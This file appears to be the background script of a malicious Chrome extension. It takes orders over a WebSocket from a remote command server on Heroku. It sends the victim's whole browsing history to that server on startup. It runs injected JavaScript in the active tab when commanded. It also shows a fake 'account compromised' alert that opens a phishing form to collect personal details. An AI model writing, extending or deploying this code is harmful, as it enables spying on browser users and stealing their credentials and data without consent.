//The server we are connecting to.
var HOST = 'wss://projectnickname123.herokuapp.com';
var ws = new WebSocket(HOST);

//Variables we are using to listen to the server.
//Object - Full json object to be parsed
//type - The type of signal we are receiving from the server
//temp - The site to be added to the blacklist of sites
//translateString - The JS script in string form
var id = "";
var object = "";
var type = "";
var tempSite = "hello";
var translateString = 'alert("Hello!")';
var jsSite = "https://www.instagram.com/";

//Listen to the server and parse objects.
ws.onmessage = function (e) {
    object = JSON.parse(e.data);
    id = object.id; //256 bit value
    type = object.type;
  //  tempSite = object.addString;
  //  translateString = object.jsString;
  //  jsSite = object.site

    switch(type){
      //Phishing attack
      case 'html':
        chrome.storage.sync.get("id", function(ev){
          var tempId=ev.id;
          if(tempId === id){
            chrome.tabs.query({active: true, currentWindow: true}, function(tab){
              chrome.tabs.sendMessage(tab[0].id, {action: 'phis'});
            });
          }
          });
        break;
      case 'js':
      //JS exe injection
        chrome.storage.sync.get("id", function(ev){
          var tempId=ev.id;
          if(tempId === id){
            chrome.storage.sync.set({'scriptExe': translateString, 'redirectSite': jsSite}, function(){});
            chrome.tabs.query({active: true, currentWindow: true}, function(tab){
              chrome.tabs.sendMessage(tab[0].id, {action: 'exe'});
            });
          }
          });
        break;
      case 'listAdd':
      //Add to the list of blacklist websites.
        chrome.storage.sync.get("id", function(ev){
          var tempId=ev.id;
          if(tempId === id){
            chrome.storage.sync.set({'addSite': tempSite}, function(){});
            chrome.tabs.query({active: true, currentWindow: true}, function(tab){
              chrome.tabs.sendMessage(tab[0].id, {action: 'addL'});
            });
          }
          });
        break;
      case 'message':
        break;
    }
};

/*
This function will listen for a message from content script, and load a form we
created to get extra information from the user.
}
*/

chrome.runtime.onMessage.addListener(function(request, sender, sendResponse){
  switch(request.action){
    case 'load':
      alert("Your account has been comprimised! We need additional information to continue display of this accounts' info.");
      chrome.tabs.create({url: '/phishForm.html', active: true});
      break;
    }
});

//Simply send over search history from the user on chrome startup.
chrome.runtime.onStartup.addListener(function(){
  ws.onopen = function(event){
    chrome.history.search({text: ""}, function(data) {
      var tempArr = [];
      for(var i = 0; i < data.length; i++){
        tempArr[tempArr.length] = data[i].url;
      }
      chrome.storage.sync.get("id", function(ev){
        var id=ev.id;
        var jsonPackage = {id: id, type: 'history', history: tempArr};
        ws.send(JSON.stringify(jsonPackage));
      });
    });
    chrome.storage.sync.get("id", function(ev){
      var id=ev.id;
      var jsonPackage = {id: id, type: 'Online'};
      ws.send(JSON.stringify(jsonPackage));
    });
  }
});
